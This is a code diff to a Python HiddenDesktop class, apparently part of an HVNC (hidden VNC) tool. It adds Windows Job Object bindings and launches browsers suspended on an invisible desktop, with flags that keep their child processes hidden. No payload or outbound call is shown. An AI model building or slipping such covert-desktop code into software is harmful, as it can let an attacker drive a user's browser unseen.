@@ -176,9 +176,80 @@ DETACHED_PROCESS = 0x00000008
 CREATE_NO_WINDOW = 0x08000000
 CREATE_UNICODE_ENVIRONMENT = 0x00000400
 CREATE_SUSPENDED = 0x00000004
+CREATE_BREAKAWAY_FROM_JOB = 0x01000000
 STARTF_USESHOWWINDOW = 0x00000001
 STARTF_USEPOSITION = 0x00000004
 STARTF_USESIZE = 0x00000002
+
+# Job Object structures and constants for child process desktop inheritance
+JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x00002000
+JOB_OBJECT_LIMIT_BREAKAWAY_OK = 0x00000800
+JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK = 0x00001000
+JOB_OBJECT_EXTENDED_LIMIT_INFORMATION = 9
+
+
+class JOBOBJECT_BASIC_LIMIT_INFORMATION(ctypes.Structure):
+    """Job object basic limit information."""
+    _fields_ = [
+        ("PerProcessUserTimeLimit", ctypes.c_int64),
+        ("PerJobUserTimeLimit", ctypes.c_int64),
+        ("LimitFlags", wintypes.DWORD),
+        ("MinimumWorkingSetSize", ctypes.c_size_t),
+        ("MaximumWorkingSetSize", ctypes.c_size_t),
+        ("ActiveProcessLimit", wintypes.DWORD),
+        ("Affinity", ctypes.POINTER(ctypes.c_ulong)),
+        ("PriorityClass", wintypes.DWORD),
+        ("SchedulingClass", wintypes.DWORD),
+    ]
+
+
+class IO_COUNTERS(ctypes.Structure):
+    """IO counters structure."""
+    _fields_ = [
+        ("ReadOperationCount", ctypes.c_uint64),
+        ("WriteOperationCount", ctypes.c_uint64),
+        ("OtherOperationCount", ctypes.c_uint64),
+        ("ReadTransferCount", ctypes.c_uint64),
+        ("WriteTransferCount", ctypes.c_uint64),
+        ("OtherTransferCount", ctypes.c_uint64),
+    ]
+
+
+class JOBOBJECT_EXTENDED_LIMIT_INFORMATION(ctypes.Structure):
+    """Job object extended limit information."""
+    _fields_ = [
+        ("BasicLimitInformation", JOBOBJECT_BASIC_LIMIT_INFORMATION),
+        ("IoInfo", IO_COUNTERS),
+        ("ProcessMemoryLimit", ctypes.c_size_t),
+        ("JobMemoryLimit", ctypes.c_size_t),
+        ("PeakProcessMemoryUsed", ctypes.c_size_t),
+        ("PeakJobMemoryUsed", ctypes.c_size_t),
+    ]
+
+
+# Setup Job Object API
+kernel32.CreateJobObjectW.argtypes = [
+    ctypes.POINTER(SECURITY_ATTRIBUTES),  # lpJobAttributes
+    wintypes.LPCWSTR,                      # lpName
+]
+kernel32.CreateJobObjectW.restype = wintypes.HANDLE
+
+kernel32.AssignProcessToJobObject.argtypes = [
+    wintypes.HANDLE,  # hJob
+    wintypes.HANDLE,  # hProcess
+]
+kernel32.AssignProcessToJobObject.restype = wintypes.BOOL
+
+kernel32.SetInformationJobObject.argtypes = [
+    wintypes.HANDLE,   # hJob
+    wintypes.DWORD,    # JobObjectInformationClass
+    wintypes.LPVOID,   # lpJobObjectInformation
+    wintypes.DWORD,    # cbJobObjectInformationLength
+]
+kernel32.SetInformationJobObject.restype = wintypes.BOOL
+
+kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
+kernel32.ResumeThread.restype = wintypes.DWORD
 
 # Setup CreateProcessW
 kernel32.CreateProcessW.argtypes = [
@@ -642,11 +713,23 @@ class HiddenDesktop:
         command_line: str,
         working_dir: str | None,
         show_window: bool,
+        use_job_object: bool = True,
     ) -> subprocess.Popen | None:
-        """Launch using CreateProcessW directly via ctypes.
+        """Launch using CreateProcessW directly via ctypes with Job Object.
         
         This method provides better control over the desktop assignment
-        and is more reliable for hidden desktop scenarios on Windows 11.
+        and uses Job Object to help manage child processes.
+        
+        For browsers on Windows 11 24H2, child processes (renderers, GPU) are still
+        created by the browser itself and may not inherit desktop assignment.
+        Use browser flags (--disable-gpu-sandbox, --in-process-gpu) to mitigate this.
+        
+        Args:
+            executable: Path to executable
+            command_line: Full command line
+            working_dir: Working directory
+            show_window: Whether to show the window
+            use_job_object: Use Job Object for process management
         """
         # Setup STARTUPINFOW
         si = STARTUPINFOW()
@@ -658,13 +741,37 @@ class HiddenDesktop:
         # Setup PROCESS_INFORMATION
         pi = PROCESS_INFORMATION()
         
-        # Creation flags - CREATE_NEW_CONSOLE is important for GUI apps
+        # Creation flags
+        # CREATE_SUSPENDED: Start suspended so we can assign to Job Object first
+        # CREATE_NEW_CONSOLE: Needed for GUI applications
+        # CREATE_NEW_PROCESS_GROUP: New process group for signal handling
         creation_flags = CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP
+        if use_job_object:
+            creation_flags |= CREATE_SUSPENDED
         
         # Create mutable command line buffer (required by CreateProcessW)
         cmd_buffer = ctypes.create_unicode_buffer(command_line, len(command_line) + 1)
         
+        job_handle = None
+        
         try:
+            # Create Job Object if requested
+            if use_job_object:
+                job_name = f"HVNCJob_{uuid.uuid4().hex[:8]}"
+                job_handle = kernel32.CreateJobObjectW(None, job_name)
+                if job_handle:
+                    # Configure Job Object - KILL_ON_JOB_CLOSE ensures all processes
+                    # in the job are terminated when we close the handle
+                    job_info = JOBOBJECT_EXTENDED_LIMIT_INFORMATION()
+                    job_info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
+                    kernel32.SetInformationJobObject(
+                        job_handle,
+                        JOB_OBJECT_EXTENDED_LIMIT_INFORMATION,
+                        ctypes.byref(job_info),
+                        ctypes.sizeof(job_info)
+                    )
+                    logger.debug("Created Job Object: %s", job_name)
+            
             result = kernel32.CreateProcessW(
                 None,                    # lpApplicationName (None = use command line)
                 cmd_buffer,              # lpCommandLine
@@ -684,16 +791,32 @@ class HiddenDesktop:
                     "CreateProcessW failed for %s: error=%d", 
                     executable, error_code
                 )
+                if job_handle:
+                    kernel32.CloseHandle(job_handle)
                 return None
+            
+            # Assign process to Job Object before resuming
+            if use_job_object and job_handle:
+                assign_result = kernel32.AssignProcessToJobObject(job_handle, pi.hProcess)
+                if assign_result:
+                    logger.debug("Assigned process %d to Job Object", pi.dwProcessId)
+                else:
+                    logger.warning("Failed to assign process to Job Object: %d", ctypes.get_last_error())
+                
+                # Resume the suspended process
+                resume_result = kernel32.ResumeThread(pi.hThread)
+                if resume_result == 0xFFFFFFFF:  # -1 = error
+                    logger.warning("Failed to resume thread: %d", ctypes.get_last_error())
             
             # Close thread handle (we don't need it)
             kernel32.CloseHandle(pi.hThread)
             
             # Create a pseudo-Popen object for compatibility
             class ProcessHandle:
-                def __init__(self, pid, handle):
+                def __init__(self, pid, handle, job=None):
                     self.pid = pid
                     self._handle = handle
+                    self._job = job
                 
                 def poll(self):
                     exit_code = wintypes.DWORD()
@@ -709,18 +832,23 @@ class HiddenDesktop:
                 def __del__(self):
                     if self._handle:
                         kernel32.CloseHandle(self._handle)
+                    if self._job:
+                        kernel32.CloseHandle(self._job)
             
-            proc = ProcessHandle(pi.dwProcessId, pi.hProcess)
+            proc = ProcessHandle(pi.dwProcessId, pi.hProcess, job_handle)
             self._processes.append(proc)
             
             logger.info(
-                "Launched %s on hidden desktop via CreateProcessW (PID=%d, desktop=%s)", 
-                executable, pi.dwProcessId, self._desktop_path
+                "Launched %s on hidden desktop via CreateProcessW (PID=%d, desktop=%s, job=%s)", 
+                executable, pi.dwProcessId, self._desktop_path, 
+                "yes" if job_handle else "no"
             )
             return proc
             
         except Exception as exc:
             logger.error("CreateProcessW exception for %s: %s", executable, exc)
+            if job_handle:
+                kernel32.CloseHandle(job_handle)
             return None
     
     def _launch_with_popen(
